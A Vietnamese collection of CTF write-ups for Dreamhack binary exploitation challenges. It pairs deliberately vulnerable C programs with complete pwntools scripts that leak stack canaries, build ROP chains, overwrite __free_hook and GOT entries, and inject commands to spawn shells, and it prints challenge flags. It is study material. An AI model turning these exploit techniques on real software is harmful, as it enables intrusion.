DH{d66e84c453b960cfe37780e8ed9d70ab}
```

# Return_to_Library

## Source

<details> <summary> Source C </summary>

```c
// Name: rtl.c
// Compile: gcc -o rtl rtl.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

const char* binsh = "/bin/sh";

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Add system function to plt's entry
  system("echo 'system@plt");

  // Leak canary
  printf("[1] Leak Canary\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Overwrite return address
  printf("[2] Overwrite return address\n");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```

</details>

## Ý tưởng

- Bài này không có hàm tạo shell nhưng cung cấp cho ta hàm system, chuỗi /bin/sh, ta hoàn toàn có thể tạo shell

```c
const char* binsh = "/bin/sh";
system("echo 'system@plt");
```

## Thực thi

- Đầu tiên chương trình có canary và yêu cầu ta leak, bài này tương tự như một bài trước đó, do %s in đến byte 0x00 sẽ ngừng in, nên nếu ghi đè đến trước canary, còn byte 0x00 của canary nên không in ra được
- Vậy, ta sẽ ghi đè byte 0x00 bằng byte 0x61, sau khi lấy được canary ta sẽ phải trừ đi 0x61 là byte ghi đè

![image](https://user-images.githubusercontent.com/111769169/227799702-bd49823a-54aa-4c51-b46d-398b62073c8a.png)

```python
payload = b"a"*57
r.sendafter(b"Buf: ", payload)
r.recvuntil(b"a" * 56)
canary = u64(r.recv(8))
canary = canary - 0x61
log.info("canary: " + hex(canary))
```

- Tiếp đó, ta sẽ sử dụng gadget `pop rdi và ret` để điều khiển chương trình, do chương trình cung cấp /bin/sh và system nên ta dễ dàng có được shell

```python
payload = b"a" * 56 + p64(canary)
payload += b"a" * 8 + p64(ret) + p64(pop_rdi)
payload += p64(next(exe.search(b'/bin/sh'))) + p64(exe.sym["system"])
r.sendafter(b"Buf: ", payload)
```

## Kết quả

![image](https://user-images.githubusercontent.com/111769169/227799897-578c6c6c-c248-45db-aeba-3cb06391686c.png)

<details> <summary> full script </summary>

```python
from pwn import *

exe = ELF("./rtl")
r = remote("host3.dreamhack.games", 15274)
# r = process(exe.path)
# gdb.attach(r, gdbscript='''
#            b*main+145
#            c
#            ''')
input()
pop_rdi = 0x0000000000400853
ret = 0x0000000000400285

payload = b"a"*57
r.sendafter(b"Buf: ", payload)
r.recvuntil(b"a" * 56)
canary = u64(r.recv(8))
canary = canary - 0x61
log.info("canary: " + hex(canary))

payload = b"a" * 56 + p64(canary)
payload += b"a" * 8 + p64(ret) + p64(pop_rdi)
payload += p64(next(exe.search(b'/bin/sh'))) + p64(exe.sym["system"])
r.sendafter(b"Buf: ", payload)

r.interactive()
```

</details>

# one_shot

## Source

<details> <summary> Source </summary>

```c
// gcc -o oneshot1 oneshot1.c -fno-stack-protector -fPIC -pie

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    char msg[16];
    size_t check = 0;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("MSG: ");
    read(0, msg, 46);

    if(check > 0) {
        exit(0);
    }

    printf("MSG: %s\n", msg);
    memset(msg, 0, sizeof(msg));
    return 0;
}
```

</details>

## Ý tưởng

- Bài này chủ yếu hướng dẫn chúng ta tạo shell bằng one_gadget, tuy nhiên chỉ khác một chút ở đây

```c
    if(check > 0) {
        exit(0);
    }
```

- Nó sẽ kiểm tra biến check, biến check trong stack `rbp-0x8`

![image](https://user-images.githubusercontent.com/111769169/227836552-a392aab4-4d25-4f8c-ad72-aa28b3a2188a.png)

- vậy ta sẽ ghi đè biến check là 0x0 để được ghi tiếp chương trình

## Thực thi

- Đầu tiên người ta cho chúng ta địa chỉ libc stdout
- Ta cần dựa vào địa chỉ đó để tính ra địa chỉ base libc

```python
    r.recvuntil(b"stdout: ")
    leak = int(r.recvline(keepends=False).decode(), 16)
    libc.address = leak - 3954208
    log.info("libc: " + hex(libc.address))
```

- Tiếp đó ta tìm gadget phù hợp ở đây em chọn gadget `0x45216`
- Cuối cùng tạo payload, lưu ý do check nằm sau 24 kí tự "a" nên ta cần trả về 0 để tiếp tục chương trình

```python
    payload = b"a" * 24 + p64(0) + b"a" * 8 + p64(libc.address + one_gadget)
    r.sendafter(b"MSG: ", payload)
```

## Kết quả

![image](https://user-images.githubusercontent.com/111769169/227837108-c5a3e799-f65a-433a-972d-806b5253b970.png)

<details> <summary> full script </summary>

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./oneshot_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdbscript='''
                   b*main+138
                   b*main+102
                   c
                   ''')
    else:
        r = remote("host3.dreamhack.games", 17120)

    return r


def main():
    r = conn()
    input()
    r.recvuntil(b"stdout: ")
    leak = int(r.recvline(keepends=False).decode(), 16)
    libc.address = leak - 3954208
    log.info("libc: " + hex(libc.address))

    one_gadget = 0x45216
    payload = b"a" * 24 + p64(0) + b"a" * 8 + p64(libc.address + one_gadget)
    r.sendafter(b"MSG: ", payload)
    r.interactive()


if __name__ == "__main__":
    main()
```

</details>

# rop

## Source C

<details> <summary> Source C </summary>

```c
// Name: rop.c
// Compile: gcc -o rop rop.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Leak canary
  puts("[1] Leak Canary");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Do ROP
  puts("[2] Input ROP payload");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```

</details>

## Ý tưởng

- Bài này tương tự như những bài trước, vẫn dùng ROPgadget, one_gadget để chiếm shell

## Thực thi

### Leak canary

- Bài này tương tự như các bài trước, ta sẽ ghi đè bài 0x00 của canary thành 0x61 để %s có thể ghi hết giá trị canary

- Sau đó ta trừ 0x61 để lấy lại giá trị đúng của canary

```python
    payload = b"a" * 57
    r.sendafter(b"Buf: ", payload)
    r.recvuntil(b"a" * 56)
    canary = u64(r.recv(8)) - 0x61
    log.info("canary: " + hex(canary))
```

- Sau đó ta trở về main để tiếp tục leak

```python
    payload = b"a" * 56 + p64(canary) + b"a"*8 + p64(exe.sym['main'] + 1)
    r.sendafter(b"Buf: ", payload)
```

### Leak địa chỉ libc

- Do là ta biết được giá trị canary nên lần leak này, ta sẽ ghi đè luôn cả canary trước rip

```python
    payload = b"a" * 56 + p64(canary) + b"a"*8 + p64(pop_rdi)
    payload += p64(exe.got['puts'])
    payload += p64(exe.plt['puts']) + p64(exe.sym['main'])
    r.sendafter(b"Buf: ", payload)
```

- Do lần nhập thứ nhất ta đã setup rồi nên lần nhập thứ 2 không quan trọng

```python
    r.recvuntil(b"a" * 56)
    r.sendafter(b"Buf: ", b"a")
```

- Tính địa chỉ base libc

```python
    leak_libc = u64(r.recvline(keepends=False) + b'\0\0')
    libc.address = leak_libc - 527008
    log.info("leak libc: " + hex(leak_libc))
    log.info("base libc: " + hex(libc.address))
```

### ow rip bằng one gadget

```python
    one_gadget = 0x4f432
    payload = b"a" * 56 + p64(canary) + p64(0) + p64(libc.address + one_gadget)
    r.sendafter(b"Buf: ", payload)
    r.recvuntil(b"a" * 56)
    r.sendafter(b"Buf: ", b"a")
```

## Kết quả

![image](https://user-images.githubusercontent.com/111769169/228313627-6b0e662b-7b87-4946-9e96-cd0fa4b6f20a.png)

<details> <summary> full script </summary>

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./rop_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdbscript='''
                    b*main+199
                    c
                    c
                    ''')
    else:
        r = remote("host3.dreamhack.games", 16829)

    return r


def main():
    r = conn()
    input()

    pop_rdi = 0x00000000004007f3
    payload = b"a" * 57
    r.sendafter(b"Buf: ", payload)
    r.recvuntil(b"a" * 56)
    canary = u64(r.recv(8)) - 0x61
    log.info("canary: " + hex(canary))

    payload = b"a" * 56 + p64(canary) + b"a"*8 + p64(exe.sym['main'] + 1)
    r.sendafter(b"Buf: ", payload)

    payload = b"a" * 56 + p64(canary) + b"a"*8 + p64(pop_rdi)
    payload += p64(exe.got['puts'])
    payload += p64(exe.plt['puts']) + p64(exe.sym['main'])
    r.sendafter(b"Buf: ", payload)
    r.recvuntil(b"a" * 56)
    r.sendafter(b"Buf: ", b"a")

    leak_libc = u64(r.recvline(keepends=False) + b'\0\0')
    libc.address = leak_libc - 527008
    log.info("leak libc: " + hex(leak_libc))
    log.info("base libc: " + hex(libc.address))

    one_gadget = 0x4f432
    payload = b"a" * 56 + p64(canary) + p64(0) + p64(libc.address + one_gadget)
    r.sendafter(b"Buf: ", payload)
    r.recvuntil(b"a" * 56)
    r.sendafter(b"Buf: ", b"a")

    r.interactive()


if __name__ == "__main__":
    main()
```

</details>

# hook

## Source

<details> <summary> source C </summary>

```c
// gcc -o init_fini_array init_fini_array.c -Wl,-z,norelro
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    long *ptr;
    size_t size;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("Size: ");
    scanf("%ld", &size);

    ptr = malloc(size);

    printf("Data: ");
    read(0, ptr, size);

    *(long *)*ptr = *(ptr+1);

    free(ptr);
    free(ptr);

    system("/bin/sh");
    return 0;
}
```

</details>

## Ý tưởng

- Ở đây kĩ thuật này khá mới nên em chỉ hiểu sơ sơ là ta sẽ overwrite hàm free thành onegadget

## Thực thi

- Đầu tiên chương trình cho ta một địa chỉ libc của stdout, ta sẽ dựa vào địa chỉ đó để tính libc base

```python
libc_base = stdout - 3954208
free_hook = libc_base + 3958696
magic = libc_base + one_gadget
```

- Khi được hỏi về size chúng ta sẽ nhập size sao cho lớn hơn size payload của mình

## Kết quả

![image](https://user-images.githubusercontent.com/111769169/228539882-e6246e5c-dfa3-4990-a551-ce870f620118.png)

<details> <summary> Full script </summary>

```python
from pwn import *
p = remote("host2.dreamhack.games", 14428)
# p = process("./hook_patched")
# context.log_level = "debug"
# e = ELF("./hook_patched")
# libc = ELF("./libc.so.6")
# gdb.attach(p, gdbscript='''
#            b*main+158
#            b*main+128
#            c
#            ''')

input()
one_gadget = 0x4526a

p.recvuntil("stdout: ")
stdout = int(p.recv(14), 16)

libc_base = stdout - 3954208
free_hook = libc_base + 3958696
magic = libc_base + one_gadget
log.info(hex(libc_base) + " " + hex(free_hook))
payload = p64(free_hook) + p64(magic)

p.sendlineafter(b"Size: ", b"50")


p.sendlineafter(b"Data: ", payload)

p.interactive()
```

</details>

## Đọc thêm

- Trong hướng dẫn của dreamhack ngoài ghi đè free còn ghi đè `__malloc_hook`
- Khi thực thi thử `__malloc_hook` thì em thấy nó báo lỗi ở 2 hàm free()

```
b"*** Error in `./hook_patched': double free or corruption (fasttop): 0x000000000220a010 ***\n"
*** Error in `./hook_patched': double free or corruption (fasttop): 0x000000000220a010 ***
```

- Từ đây ta có thể đoán được nếu cuối chương trình có hai hàm free() ta nên ghi đè hàm free()

# off_by_one_001

## Source

<details> <summary> source </summary>

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void read_str(char *ptr, int size)
{
    int len;
    len = read(0, ptr, size);
    printf("%d", len);
    ptr[len] = '\0';
}

void get_shell()
{
    system("/bin/sh");
}

int main()
{
    char name[20];
    int age = 1;

    initialize();

    printf("Name: ");
    read_str(name, 20);

    printf("Are you baby?");

    if (age == 0)
    {
        get_shell();
    }
    else
    {
        printf("Ok, chance: \n");
        read(0, name, 20);
    }

    return 0;
}
```

</details>

## Ý tưởng

- Ở đây chúng ta cần ghi đè biến age thành 0 để có thể chạy được shell
- Ta thấy mảng buf[20] nằm khá gần biến v5 là age của chúng ta

```c
  char buf[20]; // [esp+0h] [ebp-18h] BYREF
  int v5; // [esp+14h] [ebp-4h]
```

- Bằng một vài phép tính ta thấy khi ta nhập full 20 byte "a" thì byte thứ 21 sẽ ghi đè được v5

```
>>> -0x18 + 20
-4
```

- Mà ta nhớ rằng, hàm read() không đọc byte null, nghĩa là khi 20 kí tự nó sẽ đọc đúng 20 kí tự, nếu muốn sử dụng 20 kí tự ấy như một xâu kí tự thì ta sẽ phải thêm byte '\0' cuối chuỗi đó.
- Câu lệnh sau cho ta thấy nếu len là 20 thì `buf[20] = '\0'` trong khi buf khai báo buf[20] nhưng trên lí thuyết ta chỉ được sử dụng đến giá trị `buf[19] = 'a'`

```c
    ptr[len] = '\0';
```

## Thực thi

- Ta sẽ nhập vào một chuỗi kí tự 20 byte

## Kết quả

![image](https://user-images.githubusercontent.com/111769169/228557377-ca9363c4-9230-4525-92dd-43caaace88e6.png)

# off_by_one_000

## Ý tưởng

- Khi ta nhập 255 byte ta thấy ta đã overwrite 1 byte null vào ebp
- Giá trị ebp lại là một địa chỉ nào đó trong buf.

![image](https://user-images.githubusercontent.com/111769169/228569563-af23eebd-2ed1-432d-b082-4dd810e415e9.png)

- Địa chỉ stack là địa chỉ động nên ta sẽ tạo payload full địa chỉ get_shell để khi ow địa chỉ ebp, dù nhảy đến địa chỉ nào trong stack thì cũng là địa chỉ của get_shell

## Kết quả

![image](https://user-images.githubusercontent.com/111769169/228578127-a837e329-d6af-46bc-a5e1-c6059a08ff69.png)

<details> <summary> Source </summary>

```python
# form solve pwn đỡ phải viết script =)))
#!/usr/bin/env python3

from pwn import *

exe = ELF("./off_by_one_000")
# libc = ELF("./libc-2.27.so")
# ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdbscript = '''
                   b*main+64
                   b*cpy+0
                   c
                   ''')
        input()
    else:
        r = remote("host3.dreamhack.games", 17014)

    return r


def main():
    r = conn()

    payload = p32(exe.sym['get_shell']) * (256 // 4)

    r.sendafter(b"Name: ", payload)
    r.interactive()


if __name__ == "__main__":
    main()
```

</details>

![image](https://user-images.githubusercontent.com/111769169/228579098-6c05078e-1adc-4ee6-af08-d7c4766b994b.png)

# cmd_center

## Source

<details> <summary> IDA </summary>

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char buf[32]; // [rsp+0h] [rbp-130h] BYREF
  char s1[10]; // [rsp+20h] [rbp-110h] BYREF
  __int16 v5; // [rsp+2Ah] [rbp-106h]
  int v6; // [rsp+2Ch] [rbp-104h]
  char v7[240]; // [rsp+30h] [rbp-100h] BYREF
  _QWORD v8[2]; // [rsp+120h] [rbp-10h] BYREF

  v8[1] = __readfsqword(0x28u);
  strcpy(s1, "ifconfig");
  s1[9] = 0;
  v5 = 0;
  v6 = 0;
  memset(v7, 0, sizeof(v7));
  init(v8, argv, v7);
  printf("Center name: ");
  read(0, buf, 100uLL);
  if ( !strncmp(s1, "ifconfig", 8uLL) )
    system(s1);
  else
    puts("Something is wrong!");
  exit(0);
}
```

</details>

## Ý tưởng

- Ban đầu đọc source C khá lú nên ta coi ida cho nó chắc
- ta thấy lỗi BOF ở `read(0, buf, 100uLL);`, ở đây ta cần phải BOF để ghi đè vào s1 để có thể thoả hàm if để chạy `system(s1)`
- Đây là một số lệnh

![image](https://user-images.githubusercontent.com/111769169/228616963-888b11dc-cbff-488f-8dba-e586f3c572c1.png)
![image](https://user-images.githubusercontent.com/111769169/228617045-b3c47761-fd67-4ee4-a083-26c790367579.png)

- Ta sẽ sử dụng dấu `;` để có thể thực thi cả 2 câu lệnh, ifconfig và /bin/sh

## Thực thi

- Đầu tiên ta cần tính offset từ buf đến s1

```
>>> -0x130 -- 0x110
-32
```

- ow đến địa chỉ s1 ta sẽ nhập `ifconfig;/bin/sh`

## Kết quả

```
Center name: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaifconfig;/bin/sh
ls
cmd_center
flag
run.sh
cat flag
DH{f4c11bf9ea5a1df24175ee4d11da0d16}
```

# ssp_000

## Source

<details> <summary> source C </summary>

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell() {
    system("/bin/sh");
}

int main(int argc, char *argv[]) {
    long addr;
    long value;
    char buf[0x40] = {};

    initialize();


    read(0, buf, 0x80);

    printf("Addr : ");
    scanf("%ld", &addr);
    printf("Value : ");
    scanf("%ld", &value);

    *(long *)addr = value;

    return 0;
}
```

</details>

## Ý tưởng

- Chương trình cho phép ta thay đổi dữ liệu của một địa chỉ
- Ta sẽ thay đổi `__stack_chk_fail` thành get_shell() (em tham khảo wu)
- Để có thể thay đổi được, ta sẽ ghi vào địa chỉ của `____stack_chk_fail` thành địa chỉ chỉ của get_shell()

## Thực thi

- Ta tính được offset từ đầu khi ghi đè canary là 80 ( vì nếu chương trình kiểm tra canary đã thay đổi thì nó sẽ thực thi `__stack_chk_fail`)
- Khi được hỏi địa chỉ thì ta sẽ ghi vào địa chỉ của `__stack_chk_fail@got` dưới dạng int
  và địa chỉ get_shell()

## Kết quả

```python
from pwn import *

exe = ELF("./ssp_000")
# libc = ELF("./libc-2.27.so")
# ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    r.sendline(b"a" * 80)
    r.sendlineafter(b"Addr : ", str(exe.got['__stack_chk_fail']))
    r.sendlineafter(b"Value : ", str(exe.sym['get_shell']))
    r.interactive()


if __name__ == "__main__":
    main()
```

![image](https://user-images.githubusercontent.com/111769169/228650651-ae36d4b8-16cd-4f8a-ad7b-a8a4a01c3f5e.png)

# fho

## source C

```c
// Name: fho.c
// Compile: gcc -o fho fho.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  char buf[0x30];
  unsigned long long *addr;
  unsigned long long value;

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  puts("[1] Stack buffer overflow");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  puts("[2] Arbitary-Address-Write");
  printf("To write: ");
  scanf("%llu", &addr);
  printf("With: ");
  scanf("%llu", &value);
  printf("[%p] = %llu\n", addr, value);
  *addr = value;

  puts("[3] Arbitrary-Address-Free");
  printf("To free: ");
  scanf("%llu", &addr);
  free(addr);

  return 0;
}
```

## Ý tưởng

- Bài này em có tham khảo một xíu
- Bài này không thể BOF được vì chúng ta chỉ có thể sử dụng 1 lần hàm read(), nếu sử dụng để leak canary thì không thể nào ret2libc
- Do đó mục tiêu của ta là thay đổi hàm nào đó
- Ở đây ta có chú ý có hàm free(), hàm free() chỉ có thể sử dụng trên địa chỉ động do malloc() tạo ra, nếu truy cập vào địa chỉ nào khác sẽ gây lỗi (theo chat-gdb)
- Ở đây ta sẽ dùng hook ow
- Ta sẽ dùng lần nhập thứ 2 để thay đổi địa chỉ hàm free() thành hàm system chẳng hạn
- Sau đó dùng lần nhập thứ 3 trỏ đến chuỗi /bin/sh
- Trên lí thuyết có thể là vậy

## Thực thi

### Leak libc

- Khi ta gdb và kiểm tra thì bên trên canary không có giá trị nào để ta có thể leak, do đó buộc phải leak libc, uy tín nhất là leak rip vì tỉ lệ đúng cao nhất

![image](https://user-images.githubusercontent.com/111769169/228671213-1ad3714b-63f6-49a9-bb26-1a7cc26ea3bc.png)

> tình hình là khi debug động thì có các giá trị lạ (có thể là rác) bên trong buf, còn debug thì sẽ giống như hình, do đó vẫn chọn rip để leak

- Tính offset

```python
    payload = b"a" * 72
    r.sendlineafter(b"Buf: ", payload)
    r.recvuntil(b"a" * 72)
    leak_libc = u64(r.recv(6) + b"\0\0")
    libc.address = leak_libc - 137994
    log.info("leak: " + hex(leak_libc))
    log.info("base: " + hex(libc.address))
```

- Kiểm tra, có đoạn 0x000 chắc là đúng r =)))

![image](https://user-images.githubusercontent.com/111769169/228674641-94732b7c-7b63-480b-bb07-7564268ea63d.png)

### Ghi đè free

- Tương tự như một vài bài trước, do chương trình cho phép ta sửa giá trị của một địa chỉ nên ta sẽ dựa vào đó để thay đổi got của free thành địa chỉ của system
- Do chương trình yêu cầu nhập vào số nguyên dương nên ta dùng str

```python
    payload = libc.sym['__free_hook']
    r.sendlineafter(b"To write: ", str(payload))
    payload = libc.sym['system']
    r.sendlineafter(b"With: ", str(payload))
```

### ghi /bin/sh

- do system và free đều chỉ sử dụng một thanh rdi để thực thi, nên ta sẽ ghi địa chỉ chuỗi /bin/sh trong file libc vào addr khi đó hàm free này đã trở thành system và nhận đối số là địa chỉ /bin/sh

```python
    payload = next(libc.search(b'/bin/sh'))
    r.sendlineafter(b"To free: ", str(payload))
    r.interactive()
```

## Kết quả

![image](https://user-images.githubusercontent.com/111769169/228676900-5f1a04b3-26cf-45b7-95a6-52914d17fcde.png)

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./fho_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdbscript='''
                   b*main+129
                   b*main+134
                   b*main+211
                   b*main+252
                   b*main+344
                   c
                   ''')
        input()
    else:
        r = remote("host3.dreamhack.games", 19902   )

    return r


def main():
    r = conn()

    payload = b"a" * 72
    r.sendlineafter(b"Buf: ", payload)
    r.recvuntil(b"a" * 72)
    leak_libc = u64(r.recv(6) + b"\0\0")
    libc.address = leak_libc - 137994
    log.info("leak: " + hex(leak_libc))
    log.info("base: " + hex(libc.address))

    payload = libc.sym['__free_hook']
    r.sendlineafter(b"To write: ", str(payload))
    payload = libc.sym['system']
    r.sendlineafter(b"With: ", str(payload))

    payload = next(libc.search(b'/bin/sh'))
    r.sendlineafter(b"To free: ", str(payload))
    r.interactive()


if __name__ == "__main__":
    main()
```
